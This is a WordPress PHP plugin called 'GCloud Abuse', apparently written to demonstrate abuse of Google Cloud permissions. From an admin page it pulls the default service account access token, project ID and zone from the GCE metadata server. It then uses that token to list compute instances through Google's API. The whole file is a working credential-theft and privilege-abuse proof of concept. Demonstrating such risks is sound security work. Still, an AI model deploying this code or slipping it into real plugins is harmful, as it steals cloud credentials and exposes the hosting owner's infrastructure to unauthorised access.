<?php
/**
 * Plugin Name:     GCloud Abuse
 * Plugin URI:      https://wpengine.com
 * Description:     Demonstrate abuse of Google Cloud permissions. DO NOT RUN THIS PLUGIN ON A PRODUCTION CLUSTER!!
 * Author:          Brandon DuRette
 * Author URI:      YOUR SITE HERE
 * Text Domain:     gcloud-abuse
 * Domain Path:     /languages
 * Version:         0.1.0
 *
 * @package         Gcloud_Abuse
 */

if ( !function_exists( 'add_action' ) ) {
        echo 'Hi there!  I\'m just a plugin, not much I can do when called directly.';
        exit;
}


function gcloud_abuse_setup_menu() {
	add_menu_page( 'GCloud Abuse', 'GCloud Abuse', 'manage_options', 'gcloud-abuse', 'gcloud_abuse_page' );
}
add_action('admin_menu', 'gcloud_abuse_setup_menu');


function gcloud_abuse_page() {
	echo "<h1>All Your GCloud Are Belong To Us!</h1>";

	$token = gcloud_abuse_get_token();
	$proof = substr($token, 0, 10);
	echo "<br><br><b>Access Token:</b> $proof...";
	$project_id = gcloud_abuse_get_project_id();
	echo "<br><b>Project ID:</b> $project_id";
	$zone = gcloud_abuse_get_zone();
	echo "<br><b>Zone:</b> $zone";

	echo "<p>";

	$instances = gcloud_abuse_get_instances($token, $project_id, $zone);

	echo "<table><tr><th>Instance Id</th><th>Name</th><th>Status</th><th>Type</th></tr>";
	foreach ($instances['items'] as $instance) {
		gcloud_abuse_emit_instance($instance);
	}
	echo "</table>";
}

function gcloud_abuse_emit_instance($instance) {
	$instance_type = end(explode('/', $instance['machineType']));

	echo "<tr><td>${instance['id']}</td><td>${instance['name']}</td><td>${instance['status']}</td><td>$instance_type</td></tr>";
}

function gcloud_abuse_load_url($url) {
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Metadata-Flavor: Google'
	));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

function gcloud_abuse_load_json($url) {
	$result = gcloud_abuse_load_url($url);
	$json = json_decode($result, true);
	return $json;
}
	
function gcloud_abuse_get_token() {
	$result = gcloud_abuse_load_json("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token");
	return $result['access_token'];;
}

function gcloud_abuse_get_project_id() {
	$project_id = gcloud_abuse_load_url("http://metadata.google.internal/computeMetadata/v1/project/project-id");
	return $project_id;
}

function gcloud_abuse_get_zone() {
	$zone = gcloud_abuse_load_url("http://metadata.google.internal/computeMetadata/v1/instance/zone");
	$zone = end(explode('/', $zone));
	return $zone;
}

function gcloud_abuse_get_instances($token, $project, $zone) {
	$url = "https://www.googleapis.com/compute/v1/projects/$project/zones/$zone/instances";
	$ch = curl_init("https://www.googleapis.com/compute/v1/projects/$project/zones/$zone/instances");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		"Authorization: Bearer $token"
	));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	$json = json_decode($result, true);
	return $json;
}
